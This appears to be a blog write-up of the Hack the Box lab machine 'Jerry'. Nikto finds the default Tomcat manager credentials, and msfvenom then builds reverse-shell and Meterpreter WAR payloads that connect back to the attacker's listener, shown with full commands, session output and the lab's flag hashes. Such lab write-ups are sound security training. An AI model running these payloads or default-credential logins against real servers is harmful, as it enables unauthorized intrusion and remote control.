---
title: "Hack the box - Jerry"
date: 2018-07-18T20:08:47+02:00
draft: false
---

This is my writeup of the Hack the Box machine [Jerry](https://www.hackthebox.com/machines/jerry).

I used Nikto for enumeration and `msfvenom` to get a reverse shell. The revere shell was unstable, so I used Meterpreter to get a more reliable foothold.

## Enumeration

The [nmap scan](nmap_scan.txt) showed a Tomcat instance, remote desktop port (3389) among other open ports.

I had no luck in getting access to the remote desktop port.

And unfortunately, the Tomcat required credentials.

The version was 7.0.88 of which there existed an exploit for privilege escalation, but this only local, not remote.

Since this was a web-server, maybe Nikto could help.

```shell
trickmask@kali:~$ nikto -h 10.10.10.95:8080
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.95
+ Target Hostname:    10.10.10.95
+ Target Port:        8080
+ Start Time:         2018-07-17 20:03:53 (GMT2)
---------------------------------------------------------------------------
+ Server: Apache-Coyote/1.1
[snip]
+ OSVDB-3233: /a/: May be Kebi Web Mail administration menu.
+ Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret'). Apache Tomcat.
+ /host-manager/html: Default Tomcat Manager / Host Manager interface found
+ /manager/html: Tomcat Manager / Host Manager interface found (pass protected)
+ /manager/status: Tomcat Server Status interface found (pass protected)
[snip]
```

It found something on the `/a/` endpoint. Opening it up only displayed an empty page.

It found `Default account found for 'Tomcat Manager Application' at /manager/html (ID 'tomcat', PW 's3cret')`. Score!

This gave access to uploading/deploying `.war` files from <http://10.10.10.95:8080/manager/html>.

## Exploit

How to get reverse shell? This is a Windows box, so we don't have the `nc` utility.

I ended up using Metasploit to generate a reverse-shell to my machine.

I got the generation script from the archive at http://netsec.ws/?p=331.

```shell
$ msfvenom -p java/jsp_shell_reverse_tcp \
LHOST=10.10.XX.XX \
LPORT=44332 \
-f war \
-o shell.war
```

I deployed `shell.war` in Tomcat, opened a listening socket on my machine `nc -lvp 44332`, and then activated the exploit by visiting the application at <http://10.10.10.95:8080/shell/>, and it connected back!
I found the flags on the desktop.

```batchfile
trickmask@kali:~/Desktop$ nc -lvp 44332
listening on [any] 44332 ...
10.10.10.95: inverse host lookup failed: Unknown host
connect to [10.10.14.234] from (UNKNOWN) [10.10.10.95] 49264
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\apache-tomcat-7.0.88>
```

## Exploit using Metepreter payload

Annoyingly the shell was rather unstable. Somewhat randomly it dropped the connection (mostly after I mistyped something). I've heard about Metepreter before, and wanted to try that out.

Using `msfvenom --list | grep meterpreter` I could find the payload I could use: `windows/x64/meterpreter_reverse_tcp`.

I generated the reverse shell `.war` file:

```shell
$ msfvenom \
-p windows/x64/meterpreter_reverse_tcp  \
LHOST=10.10.XX.XX \
LPORT=44332 \
-f war \
-o meterpreter.war \
--platform windows \
--arch x64
```

And deployed `meterpreter.war` in Tomcat.

Set up the handler (in `msfconsole`)

```shell
msf > use exploit/multi/handler
msf > set payload windows/x64/meterpreter_reverse_tcp
msf > set LHOST 10.10.15.234
msf > set LPORT 44332
msf > exploit

[*] Started reverse TCP handler on 10.10.14.234:44332
```

Activated exploit by visiting <http://10.10.10.95:8080/meterpreter/>, and watched as I get a Meterpreter session from which I could launch a shell:

```batchfile
[*] Meterpreter session 4 opened (10.10.14.234:44332 -> 10.10.10.95:49278) at 2018-07-18 16:22:48 +0200

meterpreter > shell
Process 2908 created.
Channel 1 created.
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\apache-tomcat-7.0.88>type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
C:\apache-tomcat-7.0.88>
```
